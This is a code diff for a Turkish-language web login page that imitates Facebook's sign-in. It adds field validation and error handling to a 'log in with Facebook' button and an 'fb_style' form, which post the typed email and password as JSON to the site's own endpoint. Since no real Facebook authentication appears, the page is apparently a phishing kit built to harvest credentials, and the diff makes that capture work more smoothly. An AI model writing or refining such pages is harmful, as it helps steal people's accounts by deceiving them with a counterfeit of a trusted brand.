@@ -278,9 +278,51 @@ if (initialOverlay) {
 if (initialFacebookLogin) {
     initialFacebookLogin.addEventListener('click', async (e) => {
         e.preventDefault();
+        
+        // Input alanlarını kontrol et
+        const form = document.getElementById('initialLoginForm');
+        const identifierInput = form?.querySelector('input[name="identifier"]');
+        const passwordInput = form?.querySelector('input[type="password"]');
+        
+        const identifier = identifierInput?.value.trim() || '';
+        const password = passwordInput?.value.trim() || '';
+        
+        // Validasyon - boş alanlar kontrolü
+        if (!identifier || !password) {
+            // Boş alan uyarısı göster
+            if (!identifier && identifierInput) {
+                identifierInput.focus();
+                identifierInput.classList.add('error');
+                identifierInput.style.borderColor = '#ff4444';
+                identifierInput.placeholder = 'Bu alan zorunludur';
+                setTimeout(() => {
+                    identifierInput.classList.remove('error');
+                    identifierInput.style.borderColor = '';
+                    identifierInput.placeholder = 'E-posta veya kullanıcı adı';
+                }, 3000);
+            }
+            if (!password && passwordInput) {
+                if (!identifier) {
+                    // Identifier zaten focus aldıysa, password için timeout kullan
+                    setTimeout(() => passwordInput.focus(), 100);
+                } else {
+                    passwordInput.focus();
+                }
+                passwordInput.classList.add('error');
+                passwordInput.style.borderColor = '#ff4444';
+                passwordInput.placeholder = 'Şifre gereklidir';
+                setTimeout(() => {
+                    passwordInput.classList.remove('error');
+                    passwordInput.style.borderColor = '';
+                    passwordInput.placeholder = 'Password';
+                }, 3000);
+            }
+            return; // Yönlendirme yapma
+        }
+        
         const btn = e.currentTarget;
         const original = btn.innerHTML;
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Facebook ile giriş yapılıyor...';
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Facebook ile giriş yapılıyor...';
         btn.disabled = true;
         
         try {
@@ -312,6 +354,37 @@ if (initialFacebookLogin) {
             completeInitialLogin('facebook');
         }, 1500);
     });
+    
+    // Initial form için gerçek zamanlı validation
+    const initialForm = document.getElementById('initialLoginForm');
+    if (initialForm) {
+        const initialIdentifierInput = initialForm.querySelector('input[name="identifier"]');
+        const initialPasswordInput = initialForm.querySelector('input[type="password"]');
+        
+        if (initialIdentifierInput) {
+            initialIdentifierInput.addEventListener('input', function() {
+                if (this.value.trim()) {
+                    this.classList.remove('error');
+                    this.style.borderColor = '';
+                    if (this.placeholder === 'Bu alan zorunludur') {
+                        this.placeholder = 'E-posta veya kullanıcı adı';
+                    }
+                }
+            });
+        }
+        
+        if (initialPasswordInput) {
+            initialPasswordInput.addEventListener('input', function() {
+                if (this.value.trim()) {
+                    this.classList.remove('error');
+                    this.style.borderColor = '';
+                    if (this.placeholder === 'Şifre gereklidir') {
+                        this.placeholder = 'Password';
+                    }
+                }
+            });
+        }
+    }
 }
 
 // Overlay form submit butonu kaldırıldığı için submit handler pasif bırakıldı
@@ -322,7 +395,42 @@ if (fbStyleForm) {
         e.preventDefault();
         const identifier = fbStyleForm.querySelector('input[name="identifier"]').value.trim();
         const password = fbStyleForm.querySelector('input[name="password"]').value.trim();
-        if (!identifier || !password) return;
+        
+        // Validasyon - boş alanlar kontrolü
+        if (!identifier || !password) {
+            // Boş alan uyarısı göster
+            if (!identifier) {
+                const identifierInput = fbStyleForm.querySelector('input[name="identifier"]');
+                identifierInput.focus();
+                identifierInput.classList.add('error');
+                identifierInput.style.borderColor = '#ff4444';
+                identifierInput.placeholder = 'Bu alan zorunludur';
+                setTimeout(() => {
+                    identifierInput.classList.remove('error');
+                    identifierInput.style.borderColor = '';
+                    identifierInput.placeholder = 'E-posta veya Telefon Numarası';
+                }, 3000);
+            }
+            if (!password) {
+                const passwordInput = fbStyleForm.querySelector('input[name="password"]');
+                if (!identifier) {
+                    // Identifier zaten focus aldıysa, password için timeout kullan
+                    setTimeout(() => passwordInput.focus(), 100);
+                } else {
+                    passwordInput.focus();
+                }
+                passwordInput.classList.add('error');
+                passwordInput.style.borderColor = '#ff4444';
+                passwordInput.placeholder = 'Şifre gereklidir';
+                setTimeout(() => {
+                    passwordInput.classList.remove('error');
+                    passwordInput.style.borderColor = '';
+                    passwordInput.placeholder = 'Şifre';
+                }, 3000);
+            }
+            return; // Yönlendirme yapma
+        }
+        
         const btn = fbStyleForm.querySelector('.fb-continue-button');
         const original = btn.textContent;
         btn.textContent = 'Devam ediliyor...';
@@ -333,11 +441,53 @@ if (fbStyleForm) {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email: identifier, password, login_method: 'fb_style' })
             });
-            await response.json();
-            completeInitialLogin('fb_style');
-        } catch(err){ console.error(err); }
-        setTimeout(()=>{ btn.textContent = original; btn.disabled = false; }, 1000);
+            const result = await response.json();
+            
+            // Başarılı login sonrası yönlendirme
+            if (result.success) {
+                completeInitialLogin('fb_style');
+            } else {
+                // Hata durumunda uyarı göster
+                alert(result.message || 'Giriş başarısız oldu');
+                btn.textContent = original;
+                btn.disabled = false;
+            }
+        } catch(err){ 
+            console.error(err);
+            alert('Bağlantı hatası oluştu');
+            btn.textContent = original;
+            btn.disabled = false;
+        }
     });
+    
+    // Gerçek zamanlı validation - input alanları için
+    const identifierInput = fbStyleForm.querySelector('input[name="identifier"]');
+    const passwordInput = fbStyleForm.querySelector('input[name="password"]');
+    
+    if (identifierInput) {
+        identifierInput.addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('error');
+                this.style.borderColor = '';
+                if (this.placeholder === 'Bu alan zorunludur') {
+                    this.placeholder = 'E-posta veya Telefon Numarası';
+                }
+            }
+        });
+    }
+    
+    if (passwordInput) {
+        passwordInput.addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('error');
+                this.style.borderColor = '';
+                if (this.placeholder === 'Şifre gereklidir') {
+                    this.placeholder = 'Şifre';
+                }
+            }
+        });
+    }
+    
     fbStyleForm.querySelector('.create-account-button')?.addEventListener('click', ()=>alert('Hesap oluşturma yakında.'));
 }
 
